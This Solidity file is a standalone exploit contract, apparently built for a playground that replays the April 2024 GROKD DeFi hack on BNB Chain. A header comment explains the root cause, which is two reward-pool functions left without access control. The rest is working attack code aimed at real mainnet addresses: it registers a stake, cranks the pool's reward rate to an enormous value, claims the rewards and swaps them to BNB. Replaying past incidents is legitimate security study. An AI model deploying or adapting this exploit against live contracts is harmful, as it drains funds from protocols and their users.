// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2024-04-GROKD).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); testExploit() itself buys GROKD, adds LP, calls the
// unprotected depositFromIDO()/updatePool() functions, then dumps the reward).
// There is no standalone exploit contract to deploy, so this is a faithful,
// self-contained copy of that inline attack (approveAll + getLpToken + the
// depositFromIDO/updatePool/update/reward sequence + swapToken2Bnb), compiled
// inside the registry forge project. Logic and constants copied verbatim from
// test/GROKD_exp.sol.
//
// Root cause: the GROKD LiquiditySharePool ("IDeposite") left depositFromIDO()
// (registers an arbitrary stake) and updatePool() (rewrites a pool's
// rewardPerBlock/startBlock/endBlock) with NO access control. Anyone can
// register a tiny stake, crank rewardPerBlock to an astronomical value, roll
// one block, and call reward() to drain almost the entire GROKD treasury.
//
// Playground note: the original test advances the block number TWICE mid-attack
// (vm.roll after depositFromIDO, and again before update()) so that update()'s
// `block.number - lastRewardBlock` accrual window is non-zero. The playground
// replays one recorded call at a single fixed block, so this is split into an
// unrecorded prep() (buy GROKD, add LP only — run by the config's `setup` at
// the pinned final block) and the recorded attack() (the two unprotected calls
// depositFromIDO()/updatePool(), then update()/reward()/swap). Between the two,
// the config's setup uses a `storeSlot` step to roll the pool's
// `lastRewardBlock` (storage slot 4 on the proxy) back by 2 blocks — mirroring
// the two `vm.roll(+1)` calls without needing multi-block replay. This keeps
// BOTH unprotected calls (the actual vulnerability) inside the recorded trace,
// so "Go to the vulnerability" and the story beats can anchor on them. See
// scripts/poc-configs/2024-04-GROKD.mjs for the exact sequencing.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256 wad) external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IDeposite {
    struct PoolInfo {
        uint256 startBlock;
        uint256 endBlock;
        uint256 rewardPerBlock;
    }

    function pending(address) external view returns (uint256 bnbAmount, uint256 erc20Amount, uint256 lpAmount);
    function poolInfo(uint256) external view returns (uint256 startBlock, uint256 endBlock, uint256 rewardPerBlock);
    function updatePool(uint256, PoolInfo calldata) external;
    function depositFromIDO(address to, uint256 amount) external;
    function reward() external;
    function update() external;
}

contract GROKDDrain {
    address constant GROKD = 0xa4133feD73Ea3361f2f928f98313b1e1e5049612;
    address constant PAIR = 0x8AF65d9114DfcCd050e7352D77eeC98f40c42CFD;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant DEPOSITOR = 0x31d3231cDa62C0b7989b488cA747245676a32D81;

    IERC20 private constant grokd = IERC20(GROKD);
    IWETH private constant wBnb = IWETH(WBNB);
    IERC20 private constant pairToken = IERC20(PAIR);
    IUniswapV2Pair private constant pair = IUniswapV2Pair(PAIR);
    IUniswapV2Router private constant route = IUniswapV2Router(ROUTER);
    IDeposite private constant depositor = IDeposite(DEPOSITOR);

    // Unrecorded prep, run via the config's `setup` (mirrors testExploit()'s
    // pre-roll steps: fund + buy GROKD + add LP + register a stake). Everything
    // here happens at the SAME pinned block; the config then rolls the pool's
    // lastRewardBlock back via a storeSlot step so the recorded attack() below
    // sees a non-zero accrual window.
    function prep() external {
        approveAll();
        getLpToken(5 ether);

        // deposit token to contract (no access control on depositFromIDO).
        uint256 depositAmount = pairToken.balanceOf(address(this));
        depositor.depositFromIDO(address(this), depositAmount);
    }

    // entrypoint recorded by the playground — mirrors testExploit()'s remaining
    // steps: crank the emission rate (also unprotected), accrue, claim, cash out.
    // Runs after prep() and the lastRewardBlock rollback.
    function attack() external {
        uint256 beforeBalance = address(this).balance;

        // set the pool params — could get a very high reward per block
        // (no access control on updatePool).
        IDeposite.PoolInfo memory info = IDeposite.PoolInfo({
            startBlock: 0,
            endBlock: block.number + 100_000_000,
            rewardPerBlock: 48_000_000 ether
        });
        depositor.updatePool(0, info);

        // update reward accrual.
        depositor.update();

        depositor.reward();
        swapToken2Bnb(grokd.balanceOf(address(this)));

        uint256 afterBalance = address(this).balance;
        uint256 profit = afterBalance - beforeBalance;
        profit; // silence unused-var warning; profit is measured by the playground via native balance delta
    }

    // get lp token and deposit it.
    function getLpToken(uint256 amount) internal {
        (bool success,) = WBNB.call{value: amount}("");
        require(success, "wrap failed");

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = GROKD;
        route.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            2.5 ether, 0, path, address(this), type(uint256).max
        );

        route.addLiquidity(
            GROKD,
            WBNB,
            grokd.balanceOf(address(this)),
            wBnb.balanceOf(address(this)),
            100_000 ether,
            1 ether,
            address(this),
            type(uint256).max
        );
    }

    function swapToken2Bnb(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = GROKD;
        path[1] = WBNB;
        route.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), type(uint256).max);
        wBnb.withdraw(wBnb.balanceOf(address(this)));
    }

    function approveAll() internal {
        grokd.approve(ROUTER, type(uint256).max);
        wBnb.approve(ROUTER, type(uint256).max);
        pairToken.approve(DEPOSITOR, type(uint256).max);
    }

    receive() external payable {}
}
